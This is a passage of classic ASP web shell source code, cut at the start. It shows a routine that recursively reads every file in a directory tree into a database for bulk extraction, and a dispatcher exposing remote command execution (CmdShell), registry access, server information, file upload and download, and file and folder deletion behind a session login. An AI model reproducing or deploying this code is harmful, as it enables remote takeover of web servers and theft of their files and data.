h)  
  For Each i in Fold.files
    a=1
    pf=Mid(Path,sz)
    pi=RRePath(Path&"\"&i.Name)
    Call Mdb(pi,name,pf)
  Next
  if a="" then Call Mdb(Path,name,Mid(Path,sz))
  a=""
  For Each F in FOLD.subfolders
    Call SF(RRePath(Path & "\" & F.Name),name,sz)
  Next
End Function

Function Mdb(pi,name,pf)
  dim body,file
  on error resume next
  if Mid(pi,InstrRev(pi,"\")+1)<>name then
    if Mid(pi,InstrRev(pi,"\")+1)<>"" then
      ads.Open
      ads.Type=1
      ads.LoadFromFile pi
      file=Mid(pi,InstrRev(pi,"\")+1)
      if Err then
        Err.clear
        file=""
        body=""
      else
        body=ads.read
        Response.Write "<table align='center' width='600'>&nbsp;��� > "&pi&"<br>"
        Response.Flush
      end if
    ads.Close
  end if
  rs.addnew
  rs("folder")=pf
  rs("file")=file
  rs("body")=body
  rs.update
  end if
End Function

Select Case Action
  Case "ShowFile":Set SFSO=New LBF:SFSO.ShowFile(Session("FolderPath")):Set SFSO=Nothing
  Case "DownFile":DownFile FName
  Case "EditFile":Set SFSO=New LBF:SFSO.EditFile(FName):Set SFSO=Nothing 
  Case "DelFile":Set SFSO=New LBF:SFSO.DelFile(FName):Set SFSO=Nothing
  Case "CopyFile":Set SFSO=New LBF:SFSO.CopyFile(FName):Set SFSO=Nothing
  Case "MoveFile":Set SFSO=New LBF:SFSO.MoveFile(FName):Set SFSO=Nothing
  Case "DelFolder":Set SFSO=New LBF:SFSO.DelFolder(FName):Set SFSO=Nothing
  Case "CopyFolder":Set SFSO=New LBF:SFSO.CopyFolder(FName):Set SFSO=Nothing
  Case "MoveFolder":Set SFSO=New LBF:SFSO.MoveFolder(FName):Set SFSO=Nothing
  Case "NewFolder":Set SFSO=New LBF:SFSO.NewFolder(FName):Set SFSO=Nothing
  Case "UpFile":UpFile()
  Case "CmdShell":CmdShell()
  Case "TSearch":TSearch()
  Case "Course":Course()
  Case "TRegedit":TRegedit()
  Case "ServerInfo":ServerInfo()
  Case "DbManager":DbManager()
  Case "ToMdb":ToMdb()
  Case "Logout":Session.Contents.Remove("webadmin"):Response.Redirect URL
  Case Else      
       MainMenu()
End Select
ShowErr() 
%>
</body>
</html>